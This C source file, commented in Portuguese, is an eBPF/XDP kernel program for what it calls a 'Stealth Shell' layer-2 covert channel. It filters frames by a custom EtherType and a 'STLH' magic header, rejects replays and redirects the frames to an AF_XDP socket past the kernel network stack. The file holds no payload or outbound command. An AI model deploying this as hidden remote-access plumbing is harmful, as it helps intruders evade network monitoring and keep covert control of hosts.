// SPDX-License-Identifier: GPL-2.0
/**
 * @file xdp/xdp_kern.c
 * @brief Programa eBPF executado no Kernel para filtragem e redirecionamento de pacotes.
 * @details Este módulo implementa a filtragem em Linha de Comando (XDP fast-path) 
 * para um canal encoberto de Camada 2. Valida o EtherType customizado, 
 * inspeciona bytes mágicos, protege contra ataques de replay via tabelas 
 * Hash LRU e redireciona o tráfego legítimo para o socket AF_XDP.
 * @author Pedro Galvão
 * @date 2026
 */

#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

/** @brief EtherType customizado para identificação do tráfego do Stealth Shell (0x88B5) */
#define STEALTH_ETHERTYPE  0x88B5u

/** @brief Assinatura mágica "STLH" codificada em representação Little-Endian (0x484C5453) */
#define STEALTH_MAGIC  0x484C5453u

/**
 * @struct stealth_hdr
 * @brief Cabeçalho mínimo de controlo e validação embutido logo após o cabeçalho Ethernet.
 */
struct stealth_hdr {
    __u8  magic[4]; /**< Array contendo os caracteres mágicos de validação "STLH" */
    __u32 seq;      /**< Número de sequência do pacote para proteção da camada de rede */
} __attribute__((packed));

/**
 * @brief Mapa eBPF do tipo XSKMAP.
 * @details Faz a associação entre o índice da fila da placa de rede (Queue Index) 
 * e o File Descriptor (FD) do socket AF_XDP registado em userspace.
 */
struct {
    __uint(type,        BPF_MAP_TYPE_XSKMAP);
    __uint(max_entries, 64);
    __type(key,   __u32);
    __type(value, __u32);
} xsks_map SEC(".maps");

/**
 * @brief Mapa eBPF do tipo LRU Hash para Proteção contra Replay.
 * @details Armazena temporariamente os números de sequência (`seq`) já processados. 
 * Utiliza a política Least Recently Used (LRU) para descartar registos antigos 
 * quando atinge o limite máximo de 65.536 chaves, prevenindo exaustão de memória.
 */
struct {
    __uint(type,        BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 65536);
    __type(key,   __u32);
    __type(value, __u8);
} replay_map SEC(".maps");

/**
 * @brief Mapa eBPF Per-CPU Array para Métricas e Estatísticas.
 * @details Vetor indexado para auditoria em runtime sem contenção de locks entre núcleos:
 * - Índice 0: Contagem de pacotes válidos aceites e redirecionados.
 * - Índice 1: Contagem de pacotes duplicados/rejeitados por replay.
 */
struct {
    __uint(type,        BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 2);
    __type(key,   __u32);
    __type(value, __u64);
} stats_map SEC(".maps");

/**
 * @brief Incrementa de forma atómica os contadores de estatísticas no mapa eBPF.
 * @param idx Índice do contador a incrementar (0 para Aceites, 1 para Descartados).
 */
static __always_inline void stats_inc(__u32 idx)
{
    __u64 *cnt = bpf_map_lookup_elem(&stats_map, &idx);
    if (cnt) __sync_fetch_and_add(cnt, 1);
}

/**
 * @brief Filtro eBPF principal anexado ao gancho (hook) XDP do driver de rede.
 * @details Inspeciona sequencialmente o frame recebido a nível de hardware:
 * 1. Verifica se o tamanho do frame comporta o cabeçalho Ethernet standard.\n
 * 2. Filtra pelo EtherType customizado `0x88B5` (repassa o resto ao SO via XDP_PASS).\n
 * 3. Inspeciona a assinatura mágica no cabeçalho stealth.\n
 * 4. Valida se o número de sequência já foi visto no mapa LRU para evitar Replay (descarta via XDP_DROP).\n
 * 5. Efetua o bypass da stack de rede injetando o pacote na Queue 0 do socket AF_XDP.
 * @param ctx Ponteiro para os metadados contextuais do frame de rede (`xdp_md`).
 * @return Decisão de ação XDP (`XDP_PASS`, `XDP_DROP` ou resultado de `bpf_redirect_map`).
 */
SEC("xdp")
int xdp_stealth_filter(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data     = (void *)(long)ctx->data;

    // ── Ethernet ──────────────────────────────────────────────────────
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    bpf_printk("XDP mac2: EtherType=0x%x\n", bpf_ntohs(eth->h_proto));

    // Só frames com o nosso EtherType — todo o resto (ARP, IPv4, …) passa
    if (bpf_ntohs(eth->h_proto) != STEALTH_ETHERTYPE) {
        bpf_printk("XDP: EtherType 0x%x — PASS\n", bpf_ntohs(eth->h_proto));
        return XDP_PASS;
    }
    
    // Imprime o MAC de origem do header Ethernet exterior
    bpf_printk("XDP RX: outer_src=%02x:%02x:%02x:%02x:%02x:%02x\n",
            eth->h_source[0], eth->h_source[1], eth->h_source[2],
            eth->h_source[3], eth->h_source[4], eth->h_source[5]);

    // ── Stealth header ────────────────────────────────────────────────
    struct stealth_hdr *hdr = (void *)(eth + 1);
    
    if ((void *)(hdr + 1) > data_end)
        return XDP_PASS;
    
    // Magic check — segunda camada de filtragem
    __u32 magic;
    __builtin_memcpy(&magic, hdr->magic, 4);
    if (magic != STEALTH_MAGIC)
        return XDP_PASS;
    
    bpf_printk("XDP: STEALTH frame matched, seq=%u\n", bpf_ntohl(hdr->seq));

    // ── Replay protection ─────────────────────────────────────────────
    __u32 seq = bpf_ntohl(hdr->seq);
    __u8 *seen = bpf_map_lookup_elem(&replay_map, &seq);
    if (seen) {
        stats_inc(1);
        return XDP_DROP;
    }
    __u8 val = 1;
    bpf_map_update_elem(&replay_map, &seq, &val, BPF_NOEXIST);

    // ── Redirect para AF_XDP (sempre chave 0 — queue 0) ──────────────
    stats_inc(0);
    return bpf_redirect_map(&xsks_map, 0, XDP_DROP);
}

/** @brief Licença regulamentar exigida pelo subsistema eBPF do Kernel Linux */
char _license[] SEC("license") = "GPL";